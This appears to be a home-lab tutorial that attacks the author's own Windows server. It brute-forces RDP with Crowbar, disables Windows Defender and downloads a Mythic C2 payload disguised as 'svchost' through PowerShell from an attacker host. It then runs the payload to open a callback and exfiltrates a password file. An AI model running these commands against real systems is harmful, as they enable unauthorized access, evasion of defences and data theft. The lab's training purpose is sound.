# Day 21: Performing a Brute Force Attack and Establishing a C2 Session

## 1. Introduction

**Goal**: Learn how to perform a Brute Force attack, generate a Mythic agent, and establish a successful C2 session from a Windows server.
## 2. Objective

**Steps**:

- Use Kali Linux to perform a Brute Force attack on a Windows server.
- Perform discovery commands and defense evasion.
- Execute phase four using Mythic C2 to generate a payload with a C2 profile.
- Use PowerShell to download the Mythic agent from the Mythic C2 server.
- Establish a C2 connection and download a password file from the Windows server.

## 3. Preparing the Windows Server

**Steps**:

1. Create a fake file named `passwords.txt` in the Documents folder.
2. Change the password to `Winter2024!`:

    - Go to Start Menu > Username > Change Account Settings > Sign-in Options > Password > Change.
    - Enter current password, then set new password to `Winter2024!`.
    - If password policy requirements are not met, adjust settings in Local Group Policy Editor:
        - Minimum password length: 5 characters.
        - Disable complexity requirements.

## 4. Performing RDP Brute Force Attack

**Steps**:

1. **Log in to Kali Linux machine.**
2. **Use pre-existing word list from Kali Linux:**

Navigate to `/usr/share/wordlists`.
Unzip `rockyou.txt` using `gunzip`.

```
sudo gunzip rockyou.txt.gz
```

Extract first 50 entries and add `Winter2024!` to the list.

```
head -n50 cat rockyou.txt > /home/user/Desktop/madeup-Wordlist.txt
```


1. **Install and use Crowbar for Brute Force attack:**

Update and upgrade repositories: 

```
sudo apt-get update && sudo apt-get upgrade
```

			 
Install Crowbar: 

```
sudo apt-get install crowbar
```

Create target file with Windows server IP and username.

## 5. Continuing the Brute Force Attack

**Steps**:

**Perform Brute Force Attack**:
   
Use Crowbar to authenticate with the target IP address using CIDR notation.

```
crowbar -b rdp -u administrator -C madeup-Wordlist.txt -s <MyDFIR-WIN-Wahab-IP>/32
```

Successful RDP login with username `Administrator` and password `Winter2024!`.

**Connect via RDP**:

Use `xfreerdp` to connect to the Windows server.

Command: 

```
xfreerdp /u:Administrator /p:Winter2024! /v:<MyDFIR-WIN-Wahab-IP>:3389
```

Trust the certificate and establish RDP connection.

## 6. Discovery Commands

In RDP session open commands prompt/powershell and runs these commands to discover more about the target.

**Commands**:

1. **Who Am I**: `whoami`
2. **IP Configuration**: `ipconfig`
3. **Net User**: `net user`
4. **Net Group**: `net group`
5. **Net User (Specific User)**: `net user Administartor`

## 7. Defense Evasion

**Disable Windows Defender**:
    - Open Windows Security settings.
    - Disable Real-time protection and other security features.

## 8. Execution Phase

**Steps**:

**1. Build Mythic Agent**:
   
 Access Mythic web GUI and SSH session.
 
 In*stall Apollo agent:*

Go to Mythic Directory
```
cd Mythic/
```

 Command: 

For Root User
```
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

For Non-Root User
```
sudo -E ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

*Install HTTP C2 profile:*

Command: 

```
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

**2. Create Payload**:

- Generate new payload in Mythic web GUI.
- Select target machine (Windows) and output format (Windows Executable).
- Include all available commands and set callback host to Mythic server IP in format `http://<MyDFIR-Mythic-IP>`
- Set port `80` and leave everything else as default.
- Name the payload `MyDFIRMythicPayload`

## 9. Downloading and Executing the Payload

**Steps**:

**1. Download Payload**:
   
Copy the download link address from Mythic web GUI.
Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
Rename the downloaded file to `servicehost-wahab.exe`.

**2. Serve Payload via HTTP**:
   
Create a directory and move the payload into it.
Allow port 9999 on `MyDFIR-Mythic` using

```
ufw allow 9999
```

Use Python's HTTP server module to serve the payload on port 9999.
Command: 

```
python3 -m http.server 9999
```


**Download Payload on Windows Server**:

Use PowerShell to download the payload from the Mythic server.

Command:

```
Invoke-WebRequest -Uri http://<MyDFIR-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Administrator\Downloads\svchost-wahab.exe
```

**Execute Payload**:

```
.\svchost-wahab.exe
```

Allow the port `80` communication on `MyDFIR-Mythic` Server using

```
ufw allow port 80
```
  
Run the downloaded payload on the Windows server.

Verify the connection using `netstat` to confirm connection is established and also see in Task Manager.


```
netstat -anob
```

*If you did not find anything in netstat or Task Manger, navigate to call back in Mythic Web GUI and confirm there.*

## 10. Establishing C2 Connection

**Steps**:

**Interact with Active Callback**:
   
Use Mythic web GUI to interact with the active callback.
Run commands like `whoami` and `ifconfig` to verify the connection.

## 11. Exfiltration

**Steps**:

**Download Fake Password File**:

On Mythic GUI, callback interact

Use Mythic's download command to retrieve the `passwords.txt` file.

Command:

```
download C:\Users\Administrator\Documents\passwords.txt
```

**Verify Download**:

Check the downloaded file in Mythic web GUI.
Confirm the contents of the file.

## 12. Conclusion

**Summary**:

Successfully performed a Brute Force attack and established a C2 session.
Downloaded and executed a payload on the Windows server.
Retrieved a fake password file using the established C2 connection.

